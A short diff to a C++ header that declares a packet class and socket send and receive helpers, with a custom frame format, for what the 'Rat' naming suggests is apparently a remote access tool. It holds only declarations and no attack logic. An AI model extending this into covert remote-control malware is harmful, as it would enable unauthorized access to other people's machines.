@@ -21,6 +21,8 @@ class RatPacket {
 public:
     // FRAME FMT : [ 0xde 0xad | SIZE | MSG_TYPE | MSG | 0xbe 0xef ]
 
+    // creates blank packet
+    RatPacket();
     // takes in string content and type and defines elements of the frame
     RatPacket(std::string content, MsgType msgType);
     // extracts elements from given frame after checking if its valid
@@ -53,7 +55,8 @@ namespace RatPacketUtils {
     std::string FromHex(const std::string& hex);
     std::string FormatHex(const std::string& input);
 
-    bool Send(SOCKET& sock, const RatPacket& packet);
+    bool Send(const SOCKET& sock, const RatPacket& packet);
+    std::pair<RatPacket,bool> Recv(const SOCKET& sock);
 };
 
 #endif
